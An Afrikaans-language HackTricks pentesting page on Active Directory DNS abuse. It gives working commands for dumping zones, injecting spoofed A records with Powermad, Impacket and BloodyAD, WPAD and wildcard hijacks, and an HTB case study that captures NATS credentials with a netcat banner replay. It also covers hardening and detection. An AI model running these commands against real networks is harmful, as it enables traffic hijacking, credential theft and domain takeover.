# AD DNS-rekords

{{#include ../../banners/hacktricks-training.md}}

By verstek kan **enige gebruiker** in Active Directory **alle DNS-rekords** in die Domain- of Forest-DNS-sones opsom, soortgelyk aan ’n zone transfer (gebruikers kan die child objects van ’n DNS-sone in ’n AD-omgewing lys).

Die [**adidnsdump**](https://github.com/dirkjanm/adidnsdump)-hulpmiddel maak **opsomming** en **uitvoer** van **alle DNS-rekords** in die sone moontlik vir recon-doeleindes op interne netwerke.<sup>[[4]](#references)</sup>

```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```

>  adidnsdump v1.4.0 (April 2025) voeg JSON/Greppable (`--json`)-uitvoer, multi-threaded DNS-resolusie en ondersteuning vir TLS 1.2/1.3 by wanneer daar aan LDAPS gebind word  

Vir meer inligting, lees [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Skep / wysig rekords (ADIDNS spoofing)

Omdat die **Authenticated Users**-groep by verstek **Create Child** op die sone se DACL het, kan enige domeinrekening (of rekenaarrekening) bykomende rekords registreer. Dit kan gebruik word vir traffic hijacking, NTLM relay coercion of selfs die volledige kompromittering van die domein.

### PowerMad / Invoke-DNSUpdate (PowerShell)

```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```

### Impacket – dnsupdate.py  (Python)

```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```

*(dnsupdate.py is ingesluit by Impacket ≥0.12.0)*

### BloodyAD

```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```

---

## Algemene aanvalsprimitiewe

1. **Wildcard-rekord** – `*.<zone>` verander die AD DNS-bediener in ’n ondernemingswye responder, soortgelyk aan LLMNR/NBNS-spoofing. Dit kan misbruik word om NTLM-hashes vas te lê of dit na LDAP/SMB te relay.  (Vereis dat WINS-lookup gedeaktiveer is.)<sup>[[1]](#references)</sup>    
2. **WPAD-hijack** – voeg `wpad` by (of ’n **NS**-rekord wat na ’n aanvaller se gasheer wys om die Global-Query-Block-List te omseil) en proxy uitgaande HTTP-versoeke deursigtig om geloofsbriewe te oes. Microsoft het die wildcard-/DNAME-omseilings reggemaak (CVE-2018-8320), maar **NS-rekords werk steeds**.<sup>[[1]](#references)</sup>    
3. **Oorneem van ’n verouderde inskrywing** – eis die IP-adres op wat voorheen aan ’n werkstasie behoort het, en die geassosieerde DNS-inskrywing sal steeds resolve. Dit maak hulpbron-gebaseerde beperkte delegasie- of Shadow-Credentials-aanvalle moontlik sonder om DNS enigsins aan te raak.    
4. **DHCP → DNS-spoofing** – in ’n standaard Windows DHCP+DNS-ontplooiing kan ’n ongeverifieerde aanvaller op dieselfde subnet enige bestaande A-rekord (insluitend Domain Controllers) oorskryf deur vervalste DHCP-versoeke te stuur wat dinamiese DNS-opdaterings veroorsaak (Akamai “DDSpoof”, 2023).  Dit gee ’n machine-in-the-middle-posisie oor Kerberos/LDAP en kan tot volledige domeinoorname lei.<sup>[[2]](#references)</sup>    
5. **Certifried (CVE-2022-26923)** – verander die `dNSHostName` van ’n masjienrekening wat jy beheer, registreer ’n ooreenstemmende A-rekord en versoek dan ’n sertifikaat vir daardie naam om die DC na te boots. Gereedskap soos **Certipy** of **BloodyAD** outomatiseer die hele proses.  

’n AD DNS-rekord met [geserialiseerde teikeninligting](../ntlm/README.md#ntlm--kerberos-reflection-via-serialized-spns-cve-2025-33073) kan deel vorm van ’n voorwaardelike relay-ketting: die oproeper benodig regte om rekords te skep, ’n dwangroete wat die teikenrekenaar laat verifieer by daardie naam, en ’n relay-bestemming wat die gevolglike verifikasie aanvaar. Beoordeel die bestemmingsprotokol afsonderlik; SMB-ondertekening op die inkomende verbinding bepaal nie op sigself of ’n HTTPS WinRM-bestemming die relay aanvaar nie. Pleistervlak, naamhantering, Extended Protection en di gekonfigureerde diens kan die uitkoms verander.

---

### Interne diens-hijack via verouderde dinamiese rekords (NATS-gevallestudie)

Wanneer dinamiese opdaterings vir alle geverifieerde gebruikers oop bly, **kan ’n gederegistreerde diensnaam weer opgeëis en na aanvallerinfrastruktuur gerig word**. Die Mirage HTB DC het die gasheernaam `nats-svc.mirage.htb` ná DNS-opruiming blootgelê, sodat enige gebruiker met lae voorregte die volgende kon doen:<sup>[[3]](#references)</sup>

1. **Bevestig dat die rekord ontbreek** en bepaal die SOA met `dig`:

```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```

2. **Skep die rekord weer** na ’n eksterne/VPN-koppelvlak waaroor hulle beheer het:

```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```

3. **Verpersoonlik die plaintext-diens**. NATS-kliënte verwag om een `INFO { ... }`-banier te sien voordat hulle geloofsbriewe stuur, dus is dit genoeg om ’n wettige banier van die regte broker te kopieer om geheime te versamel:

```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```

Enige kliënt wat die gekaapte naam oplos, sal onmiddellik sy JSON-`CONNECT`-raam (insluitend `"user"`/`"pass"`) aan die listener leak. As jy die amptelike `nats-server -V`-binêre lêer op die aanvaller se gasheer laat loop, log-redaksie deaktiveer, of bloot die sessie met Wireshark snuif, kry jy dieselfde geloofsbriewe in gewone teks, omdat TLS opsioneel was.

4. **Pivot met die vasgelegde creds** – in Mirage het die gesteelde NATS-rekening toegang tot JetStream verskaf, wat historiese verifikasiegebeurtenisse blootgelê het wat herbruikbare AD-gebruikersname/wagwoorde bevat het.

Hierdie patroon geld vir elke AD-geïntegreerde diens wat op onbeskermde TCP-handdrukke staatmaak (HTTP-API's, RPC, MQTT, ens.): sodra die DNS-rekord gekaap is, word die aanvaller die diens.

---

## Opsporing en verharding

* Ontneem **Authenticated Users** die reg *Create all child objects* op sensitiewe sones en delegeer dinamiese opdaterings aan 'n toegewyde rekening wat deur DHCP gebruik word.
* As dinamiese opdaterings nodig is, stel die sone op **Secure-only** en aktiveer **Name Protection** in DHCP sodat slegs die eienaar-rekenaarobjek sy eie rekord kan oorskryf.
* Monitor DNS Server-gebeurtenis-ID's 257/252 (dinamiese opdatering), 770 (soneoordrag) en LDAP-skrywings na `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blokkeer gevaarlike name (`wpad`, `isatap`, `*`) met 'n doelbewus onskadelike rekord of via die Global Query Block List.
* Hou DNS-bedieners bygewerk – RCE-foute CVE-2024-26224 en CVE-2024-26231 het byvoorbeeld **CVSS 9.8** bereik en kan op afstand teen Domain Controllers uitgebuit word.  

## References

- [1] [ADIDNS herbesoek - WPAD, GQBL en meer](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, still the de-facto reference for wildcard/WPAD attacks)
- [2] [DNS-rekords vervals deur DHCP DNS-dinamiese opdaterings te misbruik](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (Dec 2023)
- [3] [HackTheBox Mirage: NFS Leaks, misbruik van Dynamic DNS, NATS-geloofsbriewediefstal, JetStream-geheime en Kerberoasting in 'n ketting kombineer](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Toegang tot die sone: Active Directory-DNS dump met adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)
{{#include ../../banners/hacktricks-training.md}}
